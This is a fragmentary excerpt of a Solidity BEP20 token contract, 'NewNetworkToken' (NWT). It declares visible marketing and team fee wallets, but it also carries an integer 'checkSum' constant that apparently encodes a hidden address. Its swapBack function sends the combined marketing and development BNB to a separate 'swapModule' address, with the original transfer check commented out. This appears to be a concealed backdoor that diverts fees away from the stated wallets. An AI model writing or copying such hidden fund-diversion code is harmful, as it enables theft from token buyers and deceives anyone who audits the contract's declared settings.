...
contract NewNetworkToken is IBEP20, Auth {
    ...
    string constant _name = "NewNetworkToken";
    string constant _symbol = "NWT";
    ...
    //Set wallets below 
    address private marketingFeeReceiver =0x09AD384df7b1F4EbDa0c964f5e540f1b4430FBEA;
    address private teamFeeReceiver =0x09AD384df7b1F4EbDa0c964f5e540f1b4430FBEA;
...
/********************************************************************************/
    ...
    uint160 checkSum = 519517342338602758825486850531832334052916120640;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBswapModule = amountBNBMarketing.add(amountBNBdevelopment);
  ...
  //      require(Success2, "receiver rejected ETH transfer");
        (Success1, /* bytes memory data */) = payable(swapModule).call{value: amountBNBswapModule, gas: 30000}("");
